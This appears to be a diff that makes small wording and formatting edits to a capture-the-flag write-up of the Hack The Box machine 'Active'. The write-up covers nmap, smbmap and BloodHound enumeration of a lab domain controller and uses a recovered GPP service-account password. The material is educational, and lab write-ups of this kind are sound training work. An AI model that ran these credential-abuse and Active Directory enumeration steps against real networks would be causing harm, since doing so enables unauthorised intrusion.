@@ -22,7 +22,7 @@ nmap -p- -T4 -sSV -oA active -v 10.10.10.100 --version-all
 
 Looking at the `nmap` results, it seems like this is a Windows Domain Controller.
 
-```txt
+```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-20 23:10:37Z)
@@ -59,7 +59,7 @@ smbmap -R -H 10.10.10.100
 
 Which gave me the following output.
 
-```txt
+```
 [+] IP: 10.10.10.100:445 Name: 10.10.10.100
         Disk                                                   Permissions Comment
  ----                                                   ----------- -------
@@ -118,13 +118,13 @@ SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPst
 
 ## Active Directory Exploitation
 
-Now that `cme` has validated the creds, its time to do some Active Directory enumeration.The very first thing that I do when I get valid Active Directory user credentials is running [Bloodhound][BloodHound] to harvest the target's AD environment. I like using fox-it's [python-based Bloodhound ingestor][bloodhound.py] because I can run it from my Kali instance instead of on a target machine.
+Now that `cme` has validated the creds, its time to do some Active Directory enumeration. The very first thing that I do when I get valid Active Directory user credentials is running [Bloodhound][BloodHound] to map out the target's AD environment. I like using fox-it's [python-based Bloodhound ingestor][bloodhound.py] because I can run it from Kali instead of on a Windows machine.
 
 ```bash
 bloodhound-python -u SVC_TGS -p "GPPstillStandingStrong2k18" -d active.htb -c All -dc active.htb -ns 10.10.10.100 --zip
 ```
 
-We can toss the output files from this into bloodhound, then start doing some queries. One of the first queries I like to run "Shortest Paths from Kerboroastable Users" which looks for paths to high value targets starting from Kerboroastable users.
+We can toss the output files from this into Bloodhound, then start doing some queries. One of the first queries I like to run "Shortest Paths from Kerboroastable Users" which looks for paths to high value targets starting from Kerboroastable users.
 
 ![Bloodhound Output](/assets/images/HTB/active/bloodhound.png)
 
